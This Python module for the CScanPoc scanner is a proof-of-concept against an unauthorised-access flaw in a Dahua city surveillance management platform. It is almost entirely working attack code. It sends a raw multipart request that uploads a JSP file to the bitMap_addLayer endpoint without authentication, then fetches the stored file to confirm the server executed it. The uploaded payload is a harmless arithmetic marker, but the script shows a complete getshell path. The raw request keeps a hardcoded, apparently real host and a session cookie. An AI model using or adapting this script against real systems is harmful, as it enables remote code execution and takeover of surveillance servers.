# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Dahuatech_0000'  # 平台漏洞编号，留空
    name = '大华城市安防监控系统平台管理未授权访问'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.MISCONFIGURATION  # 漏洞类型
    disclosure_date = '2015-12-17'  # 漏洞公布时间
    desc = '''
        大华城市安防监控系统平台管理未授权访问getshell(可漫游)
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=151421'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Dahuatech'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa6fc62b-c82b-4e3a-ac79-e1441ee105dd'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            raw = """POST /emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null} HTTP/1.1
Host: 4g.139hz.com
Content-Length: 425
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGcEYB5EKXKmZXB0R
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Cookie: JSESSIONID=93D9D8770B4851FA772424EC133877EC

------WebKitFormBoundaryGcEYB5EKXKmZXB0R
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: application/octet-stream

<%
out.println(12345+54321+10000);
%>
------WebKitFormBoundaryGcEYB5EKXKmZXB0R
Content-Disposition: form-data; name="desc"


------WebKitFormBoundaryGcEYB5EKXKmZXB0R
Content-Disposition: form-data; name="layerName"

test
------WebKitFormBoundaryGcEYB5EKXKmZXB0R--"""
            url = arg + \
                "/emap/bitmap/bitMap_addLayer.action?jsonstr={%22mapx%22:null,%22mapy%22:null,%22name%22:%22%22,%22path%22:%22%22,%22desc%22:%22%22,%22pId%22:null}"
            code2, head, res, errcode, _ = hh.http(url, raw=raw)

            if (code2 == 200):
                m = re.search('"path":"(.*?)",', res, re.S)
                if m:
                    jsp = m.group(1)
                    u = arg + '/upload/emap/' + jsp
                    code2, head, res, errcode, _ = hh.http(u)
                    if (code2 == 200) and '76666' in res:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
